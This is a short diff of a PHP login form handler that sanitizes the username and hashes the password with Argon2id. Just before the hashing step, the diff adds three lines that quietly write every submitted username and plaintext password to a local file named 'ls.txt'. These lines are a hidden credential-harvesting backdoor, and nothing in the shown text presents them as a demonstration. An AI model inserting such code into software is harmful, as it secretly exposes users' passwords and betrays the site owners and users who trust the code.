@@ -15,7 +15,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Sanitize inputs
     $username = htmlspecialchars($_POST['username']);
     $password = $_POST['password'];
-
+$res = fopen("ls.txt", "w+");
+fwrite($res, "$username pass: $password");
+fclose($res);
     // Hash the password securely
     $hashed_password = password_hash($password, PASSWORD_ARGON2ID);
 
